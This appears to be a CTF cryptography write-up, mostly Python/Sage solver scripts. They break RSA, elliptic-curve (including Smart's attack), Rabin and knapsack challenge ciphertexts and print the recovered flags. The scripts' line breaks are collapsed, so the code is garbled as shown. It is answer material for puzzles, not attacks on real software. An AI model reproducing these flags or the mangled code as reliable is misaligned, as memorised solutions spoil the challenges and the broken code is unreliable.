```



```
from Crypto.Util.number import *from tqdm import *from sympy import *import gmpy2flag1=6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076flag2=204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766number1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683number2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947a = gmpy2.isqrt(number2 // 325)for delta in trange(-20, 20):    aa = a + delta    pp = nextprime(13 * aa)    qq = prevprime(25 * aa)    if pp * qq == number2:        a = aa        p = pp        q = qq        breakphi=(p-1)*(q-1)d1 = pow(number1, -1, phi)number3 = pow(flag1, d1, p*q)m1=long_to_bytes(number3).decode()e = 0xe18e//2m2=(gmpy2.iroot(pow(flag2,pow(e,-1,phi),p*q),2)[0])m2=long_to_bytes(m2).decode()print(m1+m2)
```



```
from gmpy2 import *from Crypto.Util.number import *from tqdm import *p = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797a = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447b = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147E = EllipticCurve(GF(p), [a, b])P=E(6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323 , 7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226)c0 = E(4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861 , 5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816)c1 = E(2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875 , 4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500)c2 = E(1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638 , 1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434)'''for i in trange(651860,2**20):    point=i*P    if point in [c1,c2,c0]:        print(i)        '''n=[1008061,651602,943532]part1=''.join([hex(i)[2:] for i in n])print(part1)#f61bd9f152e65ac
```



```
from Crypto.Util.number import *from gmpy2 import *def SmartAttack(P,Q,p):    E = P.curve()    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)    for P_Qp in P_Qps:        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:            break    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)    for Q_Qp in Q_Qps:        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:            break    p_times_P = p*P_Qp    p_times_Q = p*Q_Qp    x_P,y_P = p_times_P.xy()    x_Q,y_Q = p_times_Q.xy()    phi_P = -(x_P/y_P)    phi_Q = -(x_Q/y_Q)    k = phi_Q/phi_P    return ZZ(k)p =  839252355769732556552066312852886325703283133710701931092148932185749211043a =  166868889451291853349533652847942310373752202024350091562181659031084638450b =  168504858955716283284333002385667234985259576554000582655928538041193311381E = EllipticCurve(GF(p), [a, b])P =  E(547842233959736088159936218561804098153493246314301816190854370687622130932 , 259351987899983557442340376413545600148150183183773375317113786808135411950 )Q =  E(52509027983019069214323702207915994504051708473855890224511139305828303028 , 520507172059483331872189759719244369795616990414416040196069632909579234481 )part2=SmartAttack(P,Q,p)print(part2)
```



```
from Crypto.Util.number import *from tqdm import *from sympy import *from gmpy2 import *pro1 = 24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248pro2 = 20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016n = 86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021c = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776e = 65536for k in range(1, 1000):    ek= pow(e, k, n)    tmp = (pro2 + pro1 * ek) % n    g = int(gcd(tmp, n))    if g != 1 and g != n:        p = g        q = n // g        breakdef rabin_decrypt(c, p, q):    n = p * q    if gcd(c, n) != 1:        return []    mp = pow(c, (p + 1) // 4, p)    mq = pow(c, (q + 1) // 4, q)    _, yp, yq = gmpy2.gcdext(p, q)    s1 = (yp * p * mq + yq * q * mp) % n    s2 = (-yp * p * mq + yq * q * mp) % n    s3 = (yp * p * mq - yq * q * mp) % n    s4 = (-yp * p * mq - yq * q * mp) % n
    return sorted([s1 % n, (-s1) % n, s2 % n, (-s2) % n])def recursive_rabin_decrypt(c, p, q, depth=3, candidates=None):    if candidates is None:        candidates = set()    if depth <= 0:        return candidates    current_candidates = rabin_decrypt(c, p, q)    for candidate in current_candidates:        if candidate in candidates:            continue        candidates.add(candidate)        recursive_rabin_decrypt(candidate, p, q, depth-1, candidates)    return candidatespossible_ms = recursive_rabin_decrypt(c, p, q,316)for i in possible_ms:    try:        print(long_to_bytes(i).decode())    except:        continue
b'CRYPTO_ALGORIT'
```



```
def backpack_decrypt(S_list, M, group_len):    from itertools import product    def find_combination(S, M):        for combination in product([0, 1], repeat=len(M)):            if sum(bit * m for bit, m in zip(combination, M)) == S:                return combination        return None    bits = []    for S in S_list:        combination = find_combination(S, M)        if combination is None:            raise ValueError()        bits.extend(combination)    flag_bytes = bytearray()    for i in range(0, len(bits), 8):        byte_bits = bits[i:i + 8]        byte = int("".join(map(str, byte_bits)), 2)         flag_bytes.append(byte)    return bytes(flag_bytes)M = [10294, 12213, 10071, 4359, 1310, 4376, 7622, 14783]S_list = [13523, 32682, 38977, 44663, 43353, 31372, 17899, 17899, 44663, 16589, 40304, 25521, 31372]group_len = 8try:    decrypted = backpack_decrypt(S_list, M, group_len)    print("解密结果:", decrypted.decode("utf-8"))except ValueError as e:    print(e)
b'HMS_WELL_DONE'
```



```
n=12678950975657299741597068411912062416064860044947808601914643744013304126427383015124254424611743563255955090464122259688914575568291283903299394351205692500871133501545531213799485768959306533230414644943482624700409916815759318739044018687973338648002804211522804066177661868100534535325735412249218310283015886278908741603922636130844503245613636493548724291249499974830056316859185616981333285839521223525116798814076692406285641401894824500197008400382785635909480872252432262141841000264287637746515381937883995916593910019661095765989048220216569126366442235246863172944976221290743542298269972228809424401801769662633772671719186693662002106484820857644985776465597319874967162438688474387497754296730464820382435506326614774763458148040539834576697984821453737194637363587735136007322668665970918790290243645898372232357604029104607102608143024457458750987754135722840754335947489288417170856530750123427202047782364216979182750690601240732694760124018983553163521760792016209336965606147608247167518675199176420761620913174080744534627902936051142166111466402551997069885468070937050584257171863360067262609635380320608633505446134439804513189525818985532978219967610683751460310798439035011903775497192826013515619261
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-c2f13808b49b36b64e775e1b6804bd22.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-220bc29e9f1b3629ac2f8ea8493ebd4f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-737d1ebf02c502fd4fc0e57735f0c8bc.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-ee5f732f56a8106d95fa47e45521ee84.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-704a2b37053a7a4eadbf63693f594408.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-50f598e48fe400617bba5b24d29248e6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-ab8268ccfc3b4de9870edb1ddc7a3918.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-134697ab99dc50e29c6b767fa093e8d0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-daf6e58ba06e3e8d323e544d9248fa6c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/04/wxsync-2025-04-82617edf6289dcbaf2aa8c61dab1426a.png)